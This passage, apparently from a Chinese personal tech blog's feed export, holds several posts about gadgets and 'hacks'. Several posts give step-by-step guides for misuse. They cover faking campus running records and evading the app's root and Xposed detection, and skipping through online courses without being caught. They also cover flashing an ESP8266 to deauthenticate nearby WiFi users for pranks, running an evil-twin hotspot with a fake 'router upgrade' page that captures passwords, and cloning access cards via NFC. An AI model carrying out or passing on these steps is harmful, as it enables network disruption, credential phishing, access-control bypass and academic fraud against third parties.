<pre><code class="html">&lt;input type=&quot;text&quot; class=&quot;text&quot; placeholder=&quot;&amp;#xe751;&amp;nbsp;用户名&quot;&gt;</code></pre>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>最后总结一下 <code>IconFont</code>的优点：</p>
<ol>
<li>有多种应用方式，可以应对不同情况引入图标字体。</li>
<li>图标库丰富，且可以对图标进行二次编辑，或者上传自己设计的图标。</li>
<li>引用时只需添加自己创建的项目中的图标文件即可，而不需要将整个图标库引入。节省空间，加快加载速度。</li>
<li>支持国产。</li>
</ol>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title>微信“跳一跳”自己动</title>
    <url>/2017/12/31/wechat-jump-hack/</url>
    <content><![CDATA[<p>最近微信出了个“跳一跳”小游戏，不得不说，鹅厂又剽窃人家了。作为一个手残党，跳了几次最多也就几十下。大写的不服，那就请python帮忙跳呗，因缺思听。</p>
<span id="more"></span>

<h3 id="程序大法"><a href="#程序大法" class="headerlink" title="程序大法"></a>程序大法</h3><p>今天去<code>@神奇的战士-王松</code>的GitHub上一逛，发现他已经把Python脚本编译成可执行文件了。真正意义上的方便大众了，省的配置Python环境，点赞。</p>
<h5 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h5><p><a href="https://pan.baidu.com/s/1c2NL0Ik">STOP_jump_win</a>    </p>
<p><a href="https://pan.baidu.com/s/1hrA5OB6">STOP_jump_macOS</a></p>
<p>下载对应你系统的程序，解压。我这是win，就以第一个为例。然后根据你手机机型选择配置文件<code>config.json</code>。手机连接电脑，并且打开USB调试（下文有说明）。双击运行<code>stop_jump.exe</code>即可。</p>
<p>其实本质还是一样的，编译了一下，更方便了。</p>
<h3 id="程序小法"><a href="#程序小法" class="headerlink" title="程序小法"></a>程序小法</h3><h5 id="Python2"><a href="#Python2" class="headerlink" title="Python2"></a>Python2</h5><p>该程序是通过Python2来实现的，所以我们先安装它。这个不多说了，百度教程大把大把的。</p>
<p><a href="https://www.python.org/">python官网</a></p>
<p>下载python2.x版本，安装即可。注意为python2“添加环境变量”，这个在安装对话框中可以直接勾选，忘记的话也可以自己添加。</p>
<h5 id="wechat-jump-game"><a href="#wechat-jump-game" class="headerlink" title="wechat_jump_game"></a>wechat_jump_game</h5><p>首先感谢<a href="https://github.com/wangshub">@神奇的战士-王松</a></p>
<p><a href="https://github.com/wangshub/wechat_jump_game">wechat_jump_game下载</a></p>
<p>下载这个工具，解压丢到某路径即可。</p>
<h5 id="环境依赖"><a href="#环境依赖" class="headerlink" title="环境依赖"></a>环境依赖</h5><p>之后呢，我们还得安装一些python包，用pip很方便哟。</p>
<p>打开cmd，目录定位到“wechat_jump_game”下。</p>
<pre><code class="bash">pip install -r requirements.txt
pip install image</code></pre>
<h5 id="ADB"><a href="#ADB" class="headerlink" title="ADB"></a>ADB</h5><p><a href="https://pan.baidu.com/s/1jIajHe2">ADB下载</a></p>
<p>下载这个工具，解压丢到某路径。然后为该路径添加环境变量。</p>
<p>我的电脑右击 –&gt; 属性 –&gt; 高级系统设置 –&gt; 高级 –&gt; 环境变量 –&gt; 编辑“Path” –&gt; 将“ADB”的文件夹写上</p>
<p>打开cmd敲入“adb”看看，有反应就ok。提示“不是内部或外部命令balabala”就是环境变量没做好。</p>
<h5 id="USB调试"><a href="#USB调试" class="headerlink" title="USB调试"></a>USB调试</h5><p>安卓手机需要开启USB调试。</p>
<p>以“小米6-MIUI9”为例，其他大同小异的。</p>
<p>设置 –&gt; 我的设备 –&gt; 全部参数 –&gt; MIUI版本点击下开启开发者选项</p>
<p>设置 –&gt; 系统和设备 –&gt; 更多设置 –&gt; 开发者选项 –&gt; 勾选USB调试</p>
<p>然后把手机通过数据线接到电脑，允许。</p>
<h5 id="自动跳"><a href="#自动跳" class="headerlink" title="自动跳"></a>自动跳</h5><p>手机数据线连接电脑。然后打开微信，打开跳一跳，开始游戏。</p>
<p>运行程序。</p>
<pre><code class="bash">python wechat-jump-auto.py</code></pre>
<h3 id="数学小法"><a href="#数学小法" class="headerlink" title="数学小法"></a>数学小法</h3><p><img  src="https://pic.izhaoo.com/20180104114414.jpg"  ><span class="image-caption">1</span></p>
<p><img  src="https://pic.izhaoo.com/20180104114356.jpg"  ><span class="image-caption">2</span></p>
<h3 id="凉凉"><a href="#凉凉" class="headerlink" title="凉凉"></a>凉凉</h3><p>今天是2018第一天。跳过这步就是2018啦。</p>
<p><img  src="https://pic.izhaoo.com/20180103123205.jpg"  ><span class="image-caption">2017</span></p>
<p>然鹅，我没过去，我活在了2017。</p>
<p><img  src="https://pic.izhaoo.com/20180103123300.jpg"  ><span class="image-caption">2018</span></p>
<h3 id="相关文献"><a href="#相关文献" class="headerlink" title="相关文献"></a>相关文献</h3><ol>
<li><a href="https://zhuanlan.zhihu.com/p/32452473">教你用Python来玩微信跳一跳–致敬大佬</a></li>
<li><a href="https://github.com/lt94/Wechat-Jump-Helper-List">Wechat Jump Helper List–各种语言版本</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/32492610">教你用Python来玩微信跳一跳《二》–免python环境搭建</a></li>
<li><a href="https://www.v2ex.com/t/419056">微信跳一跳 可以直接更改分数，POST 请求没有校验–直接抓包改成绩已失效</a></li>
<li><a href="https://www.zhihu.com/question/264829281/answer/287019909">怎样实现微信小游戏跳一跳的外挂？–苹果模拟触控物理法</a></li>
</ol>
<p>怎么说，一个小游戏被玩成这样，也是没谁了。神奇的战士的GitHub一天收了1k+星星，也是没谁了。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>斐讯k2 - 烧录Padavan固件</title>
    <url>/2017/12/14/k2-flash-padavan/</url>
    <content><![CDATA[<p>今天撸了个斐讯k2，希望在未来的一个月能愉快顺利下车。开箱第一件事，设置上网？NO，NO，NO，刷机才是正道，刷个Padavan吧，虽说64MB的小心脏可能会受不了。不得不说啊，k2刷固件真心简单。</p>
<span id="more"></span>

<h3 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h3><ol>
<li>我的k2固件版本是“22.5.11.5”，所以之前一些方法不能用了，像什么刷老版本固件再刷breed啊，不存在的。这里提供一种更简单的方法。</li>
<li>到<a href="http://iytc.net/k2.php">breed配置网站</a>下载breed。填入路由器的MAC地址，点击下载即可。MAC地址：后台–&gt;高级设置–&gt;系统状态</li>
<li>下载breed后刷入。后台–&gt;高级设置–&gt;系统设置–&gt;备份恢复。选择下载的“k2_breed_mac.bat”，恢复备份。</li>
<li>然后路由器关机，拔掉电源线。按住rest键，插入电源线，同时按住rest键等待几秒。然后用网线连接路由器LAN口和电脑，浏览器输入<code>192.168.1.1</code>，进入“BreedWeb恢复控制台”。</li>
<li>到<a href="http://opt.cn2qq.com/padavan/">Padavan固件</a>下载最新的Padavan固件，k2选择“RT-AC54U-GPIO-1-PSG1208-64M”。</li>
<li>BreedWeb恢复控制台–&gt;固件更新–&gt;勾选“固件”&amp;“自动更新”，固件选择刚下载的Padavan固件–&gt;上传–&gt;刷入固件</li>
<li>等待几秒路由器重启，刷入完毕。</li>
<li>WIFI名称：PACN    WIFI密码：1234567890    后台地址：192.168.123.1    后台用户名/密码：admin/admin</li>
<li>so easy</li>
</ol>
<p>刷完了，突然发现没什么好玩了，连个usb口都没，写了个脚本，LED灯颜色变变变，给室友玩儿了，室友觉得很神奇，这样，我们寝室就有三只路由器啦，这样，大冬天的大家都可以捧个电脑往上走了，春天。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>路由器</tag>
        <tag>router</tag>
      </tags>
  </entry>
  <entry>
    <title>小米路由器3 - Padavan固件</title>
    <url>/2017/12/13/mi-router-3-padavan/</url>
    <content><![CDATA[<p>小米路由器3刷Padavan（老毛子）固件。</p>
<p>今天老姐找我啊，说她们学校有个坑爹的“锐捷”校园网系统，然后她花了200买了个破解锐捷的路由器，用不了。我看了下，就一刷了固件的辣鸡TP，商家翻了十倍卖出，奸S啊。锐捷，出了名的恶心，我就想不通了，我花的网费，凭什么还给限设备。不能向恶势力低头。突然想到在我刷了Padavan固件的小米路由器上看到有“锐捷认证”这一功能。好办，拍了个小米路由器3刷了给她寄过去。</p>
<span id="more"></span>

<h3 id="Padavan固件"><a href="#Padavan固件" class="headerlink" title="Padavan固件"></a>Padavan固件</h3><p><a href="http://rt.cn2k.net/">Padavan固件中文站</a></p>
<p>这固件是从<a href="https://bitbucket.org/padavan/rt-n56u/src">Padavan固件源码</a>搬运源码汉化后编译出来的。可玩性很高，下面会介绍。</p>
<p><img  src="https://pic.izhaoo.com/20171015092323.jpg"  ><span class="image-caption">padavan</span></p>
<p>！！！注意事项:</p>
<ol>
<li>官方已经开放SSH，可直接小米路由器官网开启SSH，没必要利用漏洞。</li>
<li>Padavan固件不支持App控制，不过可以通过web端控制。</li>
<li>breed一定要备份，否则你将回不了小米固件。比如我硬是不备份。</li>
</ol>
<h3 id="功能介绍"><a href="#功能介绍" class="headerlink" title="功能介绍"></a>功能介绍</h3><p>太多太多啦，我就简单讲讲吧。</p>
<ol>
<li>FQ：ss服务器、ss客户端、vpn服务器、vpn客户端</li>
<li>广告屏蔽：Adbyby、ADM、koolproxy</li>
<li>内网穿透：花生壳、Ngrok、frp、DNSpod、CloudXNS、Aliddns</li>
<li>DDNS：这个应有尽有</li>
<li>Web：LNMP （内置应用：探针、KodExplorer、OwnCloud、Wifidog、phpMyAdmin） 当然搭个博客、私有云什么的都是可以的。</li>
<li>本地共享：FTP、Samba</li>
<li>……</li>
<li>总之，这就是台小型服务器，可玩性极高。</li>
</ol>
<p><a href="http://wiki.ubuntu.org.cn/%E9%94%90%E6%8D%B7%E3%80%81%E8%B5%9B%E5%B0%94%E8%AE%A4%E8%AF%81MentoHUST">MentoHUST</a></p>
<p><img  src="https://pic.izhaoo.com/20171213202725.jpg"  ><span class="image-caption">MentoHUST</span></p>
<h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p>小米路由器3，不用说了。</p>
<p><a href="https://pan.baidu.com/s/1c2B8KZQ">Prometheus</a> – 刷Padavan固件的Linux环境，是个vmware虚拟机备份文件。</p>
<p><a href="http://www.epinv.com/post/6304.html">VMware-v12</a> – 别用最新版本（v14），存在网络问题打不开，v12即可。</p>
<p><a href="https://eyun.baidu.com/s/3kV0JV19">Padavan最新固件</a></p>
<h3 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h3><ol>
<li>首先我们要开启路由器SSH，因为等下需要在虚拟机通过ssh的方式刷入估计。<a href="https://d.miwifi.com/rom/ssh">小米路由器SSH解锁页面</a>，我们看官方文档吧，懒得写了。</li>
</ol>
<blockquote>
<p>注意：小米路由器系统要在开发版0.5.28及以上才能解锁SSH，如果是新买的路由器还是稳定版的系统，我们得先升级。<a href="http://miwifi.com/miwifi_download.html">小米路由器固件下载</a>，下载固件丢FAT32格式的U盘里插路由器，按住rest键通电开机，等LED灯黄灯一闪一闪即可放开。</p>
</blockquote>
<p><img  src="https://pic.izhaoo.com/20171211202502.jpg"  ><span class="image-caption">刷开发板</span></p>
<ol start="2">
<li>开启SSH后。我们将“Prometheus.zip”解压。安装并打开VMware虚拟机，打开“Prometheus”虚拟机。进入虚拟机后等一会儿，进入如下界面，快速按下“ctrl”+“c”，取消进入自动安装脚本。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20171211202846.jpg"  ><span class="image-caption">退出自动安装脚本</span></p>
<ol start="3">
<li>Linux更新源在国外，下载会很慢，我们把他换成国内的163源。当然番羽.墙过的朋友可以无视，有耐心的朋友也可以无视。</li>
</ol>
<p>输入<code>sudo nano /etc/apt/sources.list</code>。在原来的源前面打上“#”注释掉，在文件尾添加以下源。</p>
<pre><code class="bash">deb http://mirrors.163.com/debian/ jessie main contrib non-free
deb-src http://mirrors.163.com/debian jessie main contrib non-free</code></pre>
<p>按“ctrl”+“x”，再按下“Y”回车，保存退出。重启一下虚拟机。</p>
<ol start="4">
<li>重启后进刷机脚本。选择5，再选择1，再再选择2。输入路由器IP回车，路由器SSH用户名回车（一般是root）,路由器SSH密码回车（SSH解锁页面可以查）。保存后重启一下。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20171211202332.jpg"  ><span class="image-caption">界面</span></p>
<ol start="5">
<li>重启后选项0没了，说明SSH连接成功。选择1，更新script脚本。选择2，更新sources源。选择3，编译toolchain工具。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20171211211748.jpg"  ><span class="image-caption">编译工具</span></p>
<ol start="6">
<li><p>选择4，编译固件。输入“no”回车，不要快速编译，会出错。这里可能比较慢，视网速而定，耐心点。</p>
</li>
<li><p>编译后会看到固件列表（好吧，其实就一个）。按回车，进行刷入固件。</p>
</li>
</ol>
<blockquote>
<p>注意：提示是否备份路由器，务必选“yes”备份。我自用这只小米路由器3就是没备份过就在也回不去官方系统了，虽然也没想过回去。</p>
</blockquote>
<ol start="8">
<li>等待几分钟，刷入完成，路由器重启。看到俩个名称为“AUSA”的路由器，连接。</li>
</ol>
<pre><code class="bash">密码：12344567890</code></pre>
<ol start="9">
<li>浏览器输入“192.168.1.1”进入路由器后台。</li>
</ol>
<pre><code class="bash">用户名：admin
密码：admin</code></pre>
<ol start="10">
<li>进去后可以看到是老版本，还是英文的。没事，我们更新一下。<a href="https://eyun.baidu.com/s/3kV0JV19">Padavan最新固件</a>，下载mi3最新固件，trx文件。然后路由器后台，高级设置–&gt;系统管理–&gt;固件刷入（抱歉，英文菜单我忘了），然后选择刚下的估计，上传即可。</li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>路由器</tag>
      </tags>
  </entry>
  <entry>
    <title>运动世界校园破解</title>
    <url>/2017/12/13/runing-go-hack-android/</url>
    <content><![CDATA[<p>安卓手机破解世界运动校园，解放双腿，上课跑、睡觉跑、随时随地都可跑。</p>
<span id="more"></span>

<h1 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h1><p>本教程是在安卓手机上刷跑步的，当然是要一只安卓机子啦，苹果机子一边稍稍。</p>
<ul>
<li><p>运动世界校园 v1.5.1 （目前最新版本）</p>
</li>
<li><p><a href="https://forum.xda-developers.com/apps/magisk/official-magisk-v7-universal-systemless-t3473445">Magisk框架</a> – 为“大牛”提供Root环境，同时自带隐藏Root功能，避免被“运动世界校园”检测。</p>
</li>
<li><p><a href="http://repo.xposed.info/module/de.robv.android.xposed.installer">Xposed框架</a> – 为“运动模拟器”提供环境支持。</p>
</li>
<li><p><a href="https://pan.baidu.com/s/1c2AmKms">大牛v1.1.8</a> – 自动巡航定位，全自动刷跑，老版本免费。</p>
</li>
<li><p><a href="https://www.coolapk.com/apk/com.specher.sm">运动模拟器</a> – Xposed模块，模拟步频。</p>
</li>
<li><p><a href="https://pan.baidu.com/s/1geDopNX">CrackZjwh</a> – Xposed模块，可以隐藏Xposed，避免被“运动世界校园”检测。</p>
</li>
<li><p><a href="https://www.coolapk.com/apk/com.excelliance.dualaid">App多开器</a> – 非必须，批量刷跑，要是系统自带就更好了。</p>
</li>
</ul>
<h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><ol>
<li>安装<code>Magisk框架</code>和<code>Xposed框架</code>，这个不同手机安装过程略有不同，具体的爬贴吧。</li>
</ol>
<p>这里提供我小米6的例子：<a href="https://note.izhaoo.com/mi6-install-magisk-xposed.html">小米6 – Magisk框架 &amp; Xposed框架</a></p>
<ol start="2">
<li><p>安装<code>运动模拟器</code>和<code>CrackZjwh</code>插件，开启模块下并重启。</p>
</li>
<li><p>运动模拟器设置，我的配置供参考。</p>
</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20171213130232.jpg"  ><span class="image-caption">1</span></p>
<ol start="4">
<li>安装<code>大牛v1.1.8</code>，打开，选择“路线模拟”功能。绘制路线，不用很精细的，因为“大牛”会自动贴合路径。最好把校园路径（我们校区比较小hhh）都覆盖一次，跑不到必经点就尴尬了。另外，速度设置为12km/h，到达终点循环，供参考。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20171213130330.jpg"  ><span class="image-caption">2</span></p>
<p><img  src="https://pic.izhaoo.com/20171213130412.jpg"  ><span class="image-caption">3</span></p>
<ol start="5">
<li>运动时间校园，<code>随机终点</code>模式开刷。如果提示“您的环境不安全无法跑步”，应该是Root或XP框架没隐藏好，参照下面“说明”排查。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20171213130151.jpg"  ><span class="image-caption">4</span></p>
<ol start="6">
<li>举手之劳顺便帮小伙伴刷了，开个App多开吧，模拟出几个“运动世界校园”，可以同时挂的。然鹅，可能有部分会失败。</li>
</ol>
<p><img  src="https://pic.izhaoo.com/20171213130023.jpg"  ><span class="image-caption">5</span></p>
<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ol>
<li><p>检测Root，用“Magisk框架”隐藏。</p>
</li>
<li><p>检测Xposed（查XP框架安装目录，一般的隐藏插件或是直接删XP-App是无效的），用“CrackZjwh”隐藏。</p>
</li>
<li><p>检测步频，步频和速度是否匹配，用“运动模拟器”模拟。</p>
</li>
<li><p>检测速度，一般控制在5-15分钟/公里即可。</p>
</li>
<li><p>检测步频&amp;速度有无波动，这个“大牛”&amp;“运动模拟器”都可模拟。“大牛”会飘，但没大毛病，另外在转角处会减速，也可模拟波动；“运动模拟器”可以设置阈值控制波动。</p>
</li>
<li><p>检测安卓模拟器，目前貌似只有“雷电模拟器”幸存了。前几个礼拜我用“夜神模拟器”，删掉nox文件可用，不知道现在可否。</p>
</li>
<li><p>检测运动世界校园版本，我们知道老版本破解很容易的。</p>
</li>
</ol>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>超星尔雅破解</title>
    <url>/2017/12/08/erya-online-class-hack-android/</url>
    <content><![CDATA[<p>我又来玩尔雅了。上次是加速播放，三分钟刷一课；这次是快进，一秒钟刷一课；下次可能就自动刷完了。技术嘛，总是在不断发展的。</p>
<span id="more"></span>

<p>先来波演示。</p>
<p><img  src="https://pic.izhaoo.com/20171208111841.jpg"  ><span class="image-caption">刷课图片演示</span></p>
<p>破解过程很简单，就是用到一个叫“超星拯救者”的xposed模块。</p>
<p>流程：root –&gt; 安装xposed框架 –&gt; 安装“超星拯救者”模块 –&gt; 刷课</p>
<p>刷课可以是两倍速度播放，或者是直接托进度条秒刷。网上有个别托进度翻车的。所以保险起见不如两倍播放吧。或者去“豌豆荚-历史版本”，下载个1.x版本的“学习通”也是比较保险的。</p>
<p>关于root和xposed框架的安装这里不做教程，因为不同的手机安装方法是不同的，自行爬贴吧，应该不难。</p>
<p>“那么我是iphone怎么刷？”    “哦？水果机呀？水果机你还想着作弊，好好学习吧。”</p>
<p>↓↓↓    被查水表是没关系的，我以人格担保。（如果怕的话，请注意。1.手机刷课期间不要用电脑登陆。2.尽量在白天刷课，晚上验证多。3.lim收敛一点，刷几课歇一歇。）</p>
<p><img  src="https://pic.izhaoo.com/20171210121700.jpg"  ><span class="image-caption">查水表</span></p>
<p>最后分享下“超星拯救者”。</p>
<p><a href="https://www.coolapk.com/apk/top.imlk.chaoxingsaviour">超星拯救者-酷安</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>hack</tag>
      </tags>
  </entry>
  <entry>
    <title>ESP8266 - WiFi黑客神器</title>
    <url>/2017/10/19/esp8266-wifi-artifact/</url>
    <content><![CDATA[<p>基于 ESP8266 制作 WiFi 干扰器和钓鱼器。</p>
<span id="more"></span>

<h1 id="WiFi-干扰器"><a href="#WiFi-干扰器" class="headerlink" title="WiFi 干扰器"></a>WiFi 干扰器</h1><h2 id="ESP8266"><a href="#ESP8266" class="headerlink" title="ESP8266"></a>ESP8266</h2><p>ESP8266 本身只是一块 WiFi 芯片，这里讲的 ESP8266 是指基于 ESP8266 芯片集成的 NodeMCU 开发板，某宝15大洋包邮，可玩性很高。今天用它来刷写 <em>esp8266_deauther</em> 固件，变身 WiFi 干扰器，一言不合断人网，KFC整人必备。</p>
<p><img  src="https://pic.izhaoo.com/20171019131746.jpg"  ><span class="image-caption">Nodemcu</span></p>
<h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>需要准备：</p>
<ul>
<li><a href="http://www.arduino.cn/thread-5838-1-1.html">ArduionIDE</a></li>
<li><a href="https://github.com/spacehuhn/esp8266_deauther">ESP8266-Deauther</a></li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>因为 ESP8266-Deauther 是基于 Arduion 开发的，所以我们要通过 ArduionIDE 刷入。安装 ArduionIDE 并打开,在 <em>文件→首选项</em> 中找到 <em>附加开发板管理器网站</em>，填入以下网址：<code>http://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p>
<p><img  src="https://pic.izhaoo.com/20171019124951.jpg"  ><span class="image-caption">填入网址</span></p>
<p>在 <em>工具→开发板→开发板管理器</em> 中安装 <em>esp8266 by ESP8266 Community</em>，版本选择 <strong>2.00</strong>。</p>
<p><img  src="https://pic.izhaoo.com/20171019125615.jpg"  ><span class="image-caption">开发板管理器选择</span></p>
<p>在 <em>文件→首选项</em> 中的 <em>在首选项中还有跟多选项可以编辑</em> 下面，点击进入目录。</p>
<p><img  src="https://pic.izhaoo.com/20171019125327.jpg"  ><span class="image-caption">进入首选项目录</span></p>
<p>将下载好的 <em>Esp8266开发包</em> 里 <em>sdk_fix</em> 文件夹下的文件分别拷到以下目录：<code>user_interface.h → packages\esp8266\hardware\esp8266\2.0.0\tools\sdk\include</code>、<code>ESP8266WiFi.cpp &amp; ESP8266WiFi.h → packages\esp8266\hardware\esp8266\2.0.0\libraries\ESP8266WiFi\src</code></p>
<p><em>文件→打开*，打开 *ESP8266-Deauther</em> 的 <em>esp8266_deauther.ino</em> 文件。通过 USB 把 NodeMCU 开发板连接到电脑。<em>工具→开发板</em> 选择 <em>NodeMcu 1.0 (ESP-12E Module)</em>，如果你的开发板不是这个记得换成对应的。<em>工具→端口</em>，选择端口，我这是 COM5。点击上传，写入固件。至此，固件刷写完成，断开ArduionIDE，NodeMcu会自动启动。</p>
<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>NodeMCU 启动后，用你的手机或电脑连接一个名为 <em>pwned</em> 的热点，默认密码是 <code>deauther</code>。连上热点后，浏览器输入 <code>192.168.4.1</code>，打开 web 界面。点击 <em>scan</em> 扫描 wifi，选中需要攻击的 wifi，选择工具方式，boom！！！另外，热点用户名密码这里也可以修改，还有其他一些配置。</p>
<p><img  src="https://pic.izhaoo.com/20180103143932.jpg"  ><span class="image-caption">选择ssid</span></p>
<p><img  src="https://pic.izhaoo.com/20180103144001.jpg"  ><span class="image-caption">攻击</span></p>
<h2 id="汉化"><a href="#汉化" class="headerlink" title="汉化"></a>汉化</h2><p>这里安装的是英文版模块。社区有大佬进行了汉化，替换即可。</p>
<p><a href="https://pan.baidu.com/s/1bp34y8R">汉化包</a></p>
<h1 id="钓鱼攻击"><a href="#钓鱼攻击" class="headerlink" title="钓鱼攻击"></a>钓鱼攻击</h1><p>先来解释一下这里的钓鱼攻击。就是说，ESP8266复制一个附近的热点，但是没有密码，如果对方连接上这个没有密码的热点，会弹出一个页面，骗你是路由器升级，需要输入路由器密码，然后密码就被我们记录下来了。</p>
<h2 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h2><p>你需要准备：</p>
<ul>
<li><a href="http://espressif.com/zh-hans/support/download/other-tools">Flash下载工具</a></li>
<li><a href="http://pan.baidu.com/s/1i51mfM9">固件</a></li>
<li><a href="http://www.arduino.cn/thread-5838-1-1.html">ArduionIDE</a></li>
<li><a href="http://pan.baidu.com/s/1pKPMi5l">Web源码</a></li>
<li><a href="http://pan.baidu.com/s/1hsIjjG4">Web源码上传工具</a></li>
</ul>
<h2 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h2><p>将 ESP8266 插到电脑，打开 <em>Flash下载工具</em>，固件包那一栏里写上固件的路径，后面那个框框应该会显示绿色的 <em>0x00000</em>。如果显示红色，我们可以关掉 Flash 下载工具再重新打开，手动填入 <code>0x00000</code> 即可。其他的配置照我的填写，务必一样。</p>
<p><img  src="https://pic.izhaoo.com/20171021085213.jpg"  ><span class="image-caption">配置</span></p>
<p>然后点击 <em>start</em> 开始烧录，过会儿提示完成关闭 Flash 下载工具。ESP8266开发板，这个不用说。我选择的是NodeMCU。安装ArduionIDE并打开，<em>文件→首选项</em>，找到 <em>附加开发板管理器网站</em>，填入以下网址：<code>http://arduino.esp8266.com/stable/package_esp8266com_index.json</code></p>
<p><img  src="https://pic.izhaoo.com/20171019124951.jpg"  ><span class="image-caption">填入网址</span></p>
<p><em>工具→开发板→开发板管理器</em>，安装 <em>esp8266 by ESP8266 Community</em>，版本选择 <strong>2.2.0</strong>。</p>
<p><img  src="https://pic.izhaoo.com/20171021085717.jpg"  ><span class="image-caption">开发板管理器选择</span></p>
<p>解压 <em>web源码上传工具</em> 中的 <em>tools</em> 文件夹，放到 ArduinoIDE 根目录里合并。<em>文件→新建<em>，新建一个空项目。</em>文件→另存为<em>，直接另存为这个空项目。</em>工具→esp8266 sketch data upload<em>，弹出一个窗口，点击 *NO</em>。然后可以发现新建的项目路径下多出一个 *data</em> 文件夹，将 <em>Web源码</em> 文件夹中的 <em>data</em> 文件夹内的三个文件拷贝到项目路径下的 <em>data</em>文件夹中。<em>工具→开发板</em>，选择 <em>NodeMcu 1.0 (ESP-12E Module)</em>，如果你的开发板不是这个记得换成对应的。<em>工具→端口</em>，选择端口，我这是COM4。工具，其他 CPU 速率、Flash 大小和我设置一样。</p>
<p><img  src="https://pic.izhaoo.com/20171021090330.jpg"  ><span class="image-caption">上传设置</span></p>
<p>点击上传，写入固件。这时候蓝灯会闪起来，等个1分钟左右，蓝灯不善了，说明烧录完成。至此，固件刷写完成，断开ArduionIDE或按下复位按钮，Esp8266会自动启动。</p>
<h2 id="使用-1"><a href="#使用-1" class="headerlink" title="使用"></a>使用</h2><p>ESP8266 重启后，能搜到一个名为 <em>HH</em> 的热点，密码是 <code>m1234567</code>，连接。连上去后，浏览器输入 <code>http://192.168.1.1/backdoor.html</code>，进入后台。勾选 <em>通用型</em>（其他型号作者还在开发），编号选择你要复制的热点，确定。</p>
<p><img  src="https://pic.izhaoo.com/20171021090847.jpg"  ><span class="image-caption">后台设置</span></p>
<p><img  src="https://pic.izhaoo.com/20171021090902.jpg"  ><span class="image-caption">成功</span></p>
<p>然后蓝灯会一直亮着，扫一下附近的 WiFi，发现有俩个一模一样的热点，一个有密码一个没密码。连接没密码的热点，弹出路由器升级，需要你输入密码。然后你输入了密码，然后提示完成。</p>
<p><img  src="https://pic.izhaoo.com/20180103143254.jpg"  ><span class="image-caption">俩个热点</span></p>
<p><img  src="https://pic.izhaoo.com/20180103143314.jpg"  ><span class="image-caption">路由器升级</span></p>
<p>然后 <em>HH</em> 这个热点又出现了，连上他，浏览器输入 <code>http://192.168.1.1/backdoor.html</code>，进入后台，可以看到刚刚我们输入的路由器密码已经保存了下来。</p>
<p><img  src="https://pic.izhaoo.com/20171021091226.jpg"  ><span class="image-caption">密码</span></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>arduino</tag>
        <tag>esp8266</tag>
      </tags>
  </entry>
  <entry>
    <title>小米6 - NFC模拟门禁卡</title>
    <url>/2017/10/13/mi6-nfc-simulation/</url>
    <content><![CDATA[<p>为小米6的NFC模拟门禁卡。</p>
<span id="more"></span>

<p>小米6的NFC是全功能模拟的，理论上是可以copy其他磁卡的，门禁滴手机，公交滴手机，是不是很骚气。燃鹅，最近版本的MiUi9又TM取消Root了，还老是不更新。终于，今天更新了，成功Root，开始折腾。</p>
<h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><ol>
<li><p>本教程只支持无加密IC卡，ID卡无效。（一般来说门禁什么的可以的，刷卡吃饭什么的就不行了）</p>
</li>
<li><p>手机需 Root、解锁system分区。</p>
</li>
</ol>
<h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>安装以下App：</p>
<p><a href="https://pan.baidu.com/s/1c1Yuo1q">Card Emulator.apk</a>、<a href="https://pan.baidu.com/s/1ge7jQgF">Mifare工具.apk</a>、<a href="https://pan.baidu.com/s/1nvy0ppJ">NFC Emulator.apk</a></p>
<p>手机需要Root，对MiUi来说so easy吧，不赘述了。</p>
<p>Root后需要解锁system分区，我们用adb命令来解锁吧。首先电脑安装刷机精灵（其实也没必要那么麻烦，装个adb就好了），手机开启USB调试，连接电脑。然后在“刷机精灵-其他板块”找到“ADB命令行”。</p>
<p><img  src="https://pic.izhaoo.com/20171013205426.jpg"  ><span class="image-caption">adb连接</span></p>
<p>依次输入以下代码：</p>
<pre><code class="bash">adb root    //获取root权限

adb disable-verity    //解锁system分区

adb reboot    //重启</code></pre>
<p><img  src="https://pic.izhaoo.com/20171013205528.jpg"  ><span class="image-caption">adb解锁system</span></p>
<p>重启后一般就成功了。</p>
<h3 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h3><p>首先要到系统设置处将“NFC默认钱包”设置为“使用HCE钱包”。</p>
<p>打开“NFC Emulator”这个App，先给予Root权限。</p>
<p><img  src="https://pic.izhaoo.com/Screenshot_2017-10-13-20-53-04-469_com.miui.secur.png"  ><span class="image-caption">基于Root权限</span></p>
<p>点击“环境监测”，看看什么Root、system分区有没有搞定。搞定了就可以卸了，这软件要收费，坚决不干！</p>
